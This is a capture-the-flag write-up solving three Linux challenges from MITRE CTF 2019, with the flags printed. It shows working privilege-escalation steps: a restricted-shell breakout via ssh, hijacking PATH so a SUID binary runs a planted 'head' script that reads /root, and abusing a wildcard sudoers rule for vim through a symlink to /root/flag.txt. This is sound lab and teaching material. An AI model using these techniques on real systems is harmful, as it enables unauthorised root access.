# Linux Solutions
## Table of Contents
1. [Clean Room (50 points)](#Clean-Room)
2. [Getting A Head (100 points)](#Getting-A-Head)
3. [January 8, 2014 (150 points)](#January-8-2014)

# Clean Room
## Problem
> ssh ctf@138.247.13.108

## Process
 - Break out of the restricted shell (rshell)
``` 
ssh ctf@138.247.13.108 -t "bash --noprofile" 
```
 - No netstat available, let's try to look in /proc/net/tcp
   - https://staaldraad.github.io/2017/12/20/netstat-without-netstat/
   - Nothing special found... wompwomp
```
grep -v "rem_address" /proc/net/tcp  | awk 'function hextodec(str,ret,n,i,k,c){
	ret = 0
	n = length(str)
	for (i = 1; i <= n; i++) {
    	c = tolower(substr(str, i, 1))
    	k = index("123456789abcdef", c)
    	ret = ret * 16 + k
	}
	return ret
} {x=hextodec(substr($2,index($2,":")-2,2)); for (i=5; i>0; i-=2) x = x"."hextodec(substr($2,i,2))}{print x":"hextodec(substr($2,index($2,":")+1,4))}'
```
 - Let's see if there's a flag file under root..

![linux50-flag](https://github.com/ryokubaka/CTF-Write-Ups/blob/master/MITRE-CTF-2019/Linux/Images/linux50-cleanroom-flag.jpg)

## Flag
MCA{ieHaisoh4eif2ae}

# Getting A Head
## Problem
> SSH into box

## Process
 - https://reverseengineering.stackexchange.com/questions/3815/reversing-elf-64-bit-lsb-executable-x86-64-gdb
 - readelf -h HackMe
   - Entry point is:

![linux100-entry](https://github.com/ryokubaka/CTF-Write-Ups/blob/master/MITRE-CTF-2019/Linux/Images/linux100-gettingahead-entry.jpg)

 - gdb HackMe
   - break "0x4005450"
   - disas 0x400450, +50

   ![linux100-gdb1](https://github.com/ryokubaka/CTF-Write-Ups/blob/master/MITRE-CTF-2019/Linux/Images/linux100-gettingahead-gdb1.jpg)

   - main() must be at 0x40056
 - It calls the Head command, it is SUID, and I can export the PATH variable
   - Create a new file called 'head' in my own directory
     ```
     - mkdir /homt/ctf/bin
     - echo '#!/bin/bash' > head
     - echo 'ls -lisa /root' >> head
     - chmod 777 head
     - export PATH="/home/ctf/bin:/home/ctf/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin:/usr/games:/usr/local/games"
     ```
    - Verify that head will run in my script

     ![linux100-gdb2](https://github.com/ryokubaka/CTF-Write-Ups/blob/master/MITRE-CTF-2019/Linux/Images/linux100-gettingahead-gdb2.jpg)

     ![linux100-gdb3](https://github.com/ryokubaka/CTF-Write-Ups/blob/master/MITRE-CTF-2019/Linux/Images/linux100-gettingahead-gdb3.jpg)

    - Let's edit head to cat the flag!

    ![linux100-flag](https://github.com/ryokubaka/CTF-Write-Ups/blob/master/MITRE-CTF-2019/Linux/Images/linux100-gettingahead-flag.jpg)

## Flag
MCA{ON5cahqu4ooguaw}

# January 8, 2014
## Problem
> SSH into box

## Process
![linux150-jan8](https://github.com/ryokubaka/CTF-Write-Ups/blob/master/MITRE-CTF-2019/Linux/Images/linux150-jan8.jpg)

 - https://www.exploit-db.com/exploits/37710
 - sudo from January 8, 2014
 - cat /etc/sudoers
 - Following line was already included:
 > ctf ALL=(root) NOPASSWD: /usr/bin/vim /home/ctf/*/*/HackMe2.txt
```
 - mkdir /home/ctf/test
 - mkdir /home/ctf/test/test
 # create symbolic link
   - ln -s /root/flag.txt HackMe2.txt
 - sudo /usr/bin/vim /home/ctf/*/*/HackMe2.txt
```
## Flag
MCA{ohghov1ieli7Eo2}